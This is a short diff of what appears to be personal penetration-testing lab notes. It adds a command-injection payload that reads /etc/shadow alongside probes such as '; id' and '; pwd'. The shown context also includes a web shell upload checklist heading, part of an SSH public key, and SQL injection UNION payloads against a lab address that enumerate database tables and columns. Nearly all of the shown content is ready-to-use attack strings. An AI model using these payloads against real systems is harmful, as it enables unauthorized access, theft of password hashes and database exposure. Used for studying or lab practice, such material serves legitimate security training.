@@ -197,6 +197,8 @@ Select your favorite fruit:
               ex: ; cmd
                   ; pwd
                   ; id
+                  ; cat /etc/shadow
+                  ;
     ------------------------------------------------3. Web Shell - Info/Access
            Conditions:
            1. Can you upload? Yes
@@ -496,3 +498,5 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoEn28opKJpPUoxxI/MFFZwDz85ilp39vOpzhL6f97
       #Filtering
       http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns; #
       http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns WHERE table_schema='session'; #
+
+
